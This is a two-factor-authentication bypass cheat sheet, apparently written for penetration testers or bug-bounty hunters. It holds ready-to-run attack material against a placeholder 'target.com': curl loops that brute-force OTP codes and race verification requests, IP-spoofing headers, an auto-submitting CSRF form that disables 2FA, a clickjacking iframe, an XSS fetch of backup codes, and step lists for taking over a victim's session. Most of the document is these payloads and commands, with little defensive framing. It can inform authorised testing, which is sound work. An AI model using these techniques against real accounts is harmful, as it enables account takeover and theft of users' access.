# 1. Direct Bypass Methods
## A. endpoint Jumping

```yaml
1. Complete 2FA → note next endpoint
2. Skip 2FA → access endpoint directly
3. Add Referrer header if blocked:
Referer: https://target.com/2fa-verify
```

# B. Token Reuse/Leakage

```yaml
# Reuse old OTP tokens
POST /verify-2fa
{"code": "123456"}  # Used successfully earlier

# Check response for token exposure
GET /api/user → {"2fa_token": "abc123..."}

# Use verification link from email
Click: https://target.com/verify?token=xyz
→ Directly logged in (no 2FA prompt)
```

## C. Session Manipulation

```yaml
1. Login to victim account → stop at 2FA
2. Login to your account → complete 2FA
3. Back to victim tab → refresh/continue
→ May inherit your 2FA status
```

# 2. Password Reset Bypasses

## A. Password Reset = 2FA Bypass

```yaml
1. Activate 2FA on account
2. Reset password (get reset link)
3. Login with new password
→ Often bypasses 2FA requirement
```

# B. Reset Link Reuse

```yaml
1. Get password reset link
2. Reset password → login
3. Use same link again → reset again
4. Login without 2FA each time
```

# 3. OAuth/SSO Bypasses

## A. Compromised OAuth Account

```yaml
1. Compromise victim's Google/Facebook
2. Login via "Sign in with Google"
→ Often bypasses native 2FA
```

## B. Different Auth Paths

```yaml
Login via:
- /login → requires 2FA
- /oauth/authorize → may skip 2FA
- /saml/login → different 2FA rules
```

# 4. Brute Force Attacks
## A. No Rate Limit

```python
# Simple brute force
for i in {000000..999999}; do
  curl -X POST https://target.com/verify-2fa \
    -d "code=$i" -H "Cookie: session=..."
done
```

## B. Rate Limit Reset via Resend

```yaml
1. Hit rate limit after 5 attempts
2. Click "Resend code"
3. Rate limit resets → continue brute force
4. Repeat
```

## C. Response Timing Differences

```yaml
# Check for timing differences
Valid code: 200 OK (immediate)
Invalid code: 429 Rate Limited (delayed)

# Even if 429, valid code still returns 200
```

## D. Client-Side Rate Limit Bypasses

```yaml
# Remove client-side validation
Delete: <input maxlength="6" disabled>
Or intercept: remove rate-limit headers
```

## 5. OTP Generation Flaws
## A. Predictable OTPs

```yaml
# If OTP based on timestamp
OTP = md5(timestamp % 1000000)
→ Generate same OTP as server
```

## B. Weak OTP Algorithms

```yaml
# Common weak patterns:
- Last 6 digits of phone number
- First 6 of user_id
- Hash of email + date
```

## C. OTP Send in Response

```yaml
POST /send-2fa → Response: {"otp": "123456"}
POST /verify-2fa → Use same OTP
```

# 6. "Remember Me" & Cookie Attacks
## A. Predictable Remembers Tokens

```yaml
Cookie: remember_me=user123_timestamp
→ Guess: user123_[current_timestamp]
```

# B. IP bypass with Headers

```yaml
X-Forwarded-For: [victim_ip]
X-Real-IP: [victim_ip]
CF-Connecting-IP: [victim_ip]
→ Bypass "only from registered IP"
```

# 7. Race conditions
## A. Multiple Verification Requests

```yaml
# Send 100 verification requests at once
for i in {1..100}; do
  curl -X POST /verify-2fa -d "code=111111" &
done
→ One might succeed
```

# B. OTP Generation Race

```yaml
1. Request OTP → get code ABC123
2. Immediately request another OTP
3. First code still valid for short window
→ Two valid codes active
```

# 8. CSRF/Clickjacking Attacks

## A. Disable 2FA via CSRF

```html
<!-- Victim visits page -->
<form action="https://target.com/disable-2fa" method="POST">
  <input type="hidden" name="confirm" value="1">
</form>
<script>document.forms[0].submit()</script>
```

## B. Clickjacking Verification

```html
<iframe src="https://target.com/2fa-verify" 
        style="opacity:0;position:fixed;top:0;left:0">
</iframe>
<!-- Victim clicks anywhere → submits 2FA -->
```

# 9. Version/Endpoint Differences

## A. Old API Versions

```yaml
/v1/login → requires 2FA
/v2/login → requires 2FA
/v0/login → no 2FA check (legacy)
/beta/login → different rules
```

# B. Subdomain Differences

```yaml
app.target.com → 2FA enabled
old.target.com → no 2FA
admin.target.com → different 2FA
api.target.com → token-based (no 2FA)
```

# 10. Backup Code Attack
## A. Generate & Steal Immediately

```yaml
1. Enable 2FA → backup codes generated
2. Codes often displayed once
3. XSS/CORS can steal:
fetch('/2fa/backup-codes').then(r=>r.json())
```

# B. Unlimited Backup Code Generation

```yaml
POST /2fa/generate-backup-codes
→ Get new codes, old ones still work
→ Generate infinite attempts
```

# 11. Information Disclosure

## A. 2FA Page Leaks

```yaml
GET /2fa-verify → Response includes:
- Phone number last 4 digits
- Email address
- Recovery questions
- Device info
```

## B. Error Messages

```yaml
Invalid code: "Code 123456 expired at 14:30"
→ Reveals valid code format/timing
```

# 12. Decoy Requests & Evasion

## A. Bypass Rate Limits with Noise

```ymal
# Mix real attempts with noise
Real: code=123456
Noise: code=000001, code=999999, code=111111
→ Harder to detect pattern
```

## B. Change Parameter

```yaml
POST /verify-2fa?code=123456
POST /verify-2fa/123456
POST /api/v1/2fa {"otp":"123456"}
POST /2fa/validate/123456
→ Different endpoints, different limits
```

# 13. Quick Testing Workflow

### Setp1: Rcon

```yaml
# Find all auth endpoints
gobuster dir -u https://target.com -w auth-wordlist.txt
# Check: /2fa, /verify, /otp, /mfa, /totp
```

### Step 2: Test Basic Bypasses

```yaml
1. Direct endpoint access after login
2. Password reset → login
3. OAuth login
4. "Remember me" cookie guess
```

### Step 3: Test Rate Limits

```yaml
1. Try 10 codes quickly
2. If blocked, wait 1 min
3. Click "resend code"
4. Try again
```

### Step 4: Check OTP Logic

```yaml
1. Enable 2FA on your account
2. Note OTP pattern
3. Try to predict victim's OTP
```

### Step 5: Session Testing

```yaml
1. Two browsers: victim + your account
2. Complete 2FA on yours
3. Switch to victim → continue
```

# 14. One-Liner Tests

```yaml
# Test rate limit reset
curl -X POST https://target.com/resend-otp && \
curl -X POST https://target.com/verify-otp -d "code=111111"

# Test multiple endpoints
for endpoint in verify validate confirm check; do
  curl -X POST "https://target.com/2fa/$endpoint" -d "code=123456"
done

# Test IP bypass
curl -H "X-Forwarded-For: 192.168.1.100" \
     https://target.com/2fa-verify
```

# 15. Critical Finding Priority

1. **No rate limiting** on OTP attempts
    
2. **Password reset bypasses 2FA**
    
3. **Direct endpoint access** after login
    
4. **Predictable OTPs** (time-based/static)
    
5. **Session mixing** (your 2FA applies to victim)
    
6. **CSRF to disable 2FA**
    
7. **Backup codes accessible via XSS/CORS**
    
8. **Old API versions without 2FA**
    
9. **"Remember me" cookie guessing**
    
10. **Race conditions** in verification
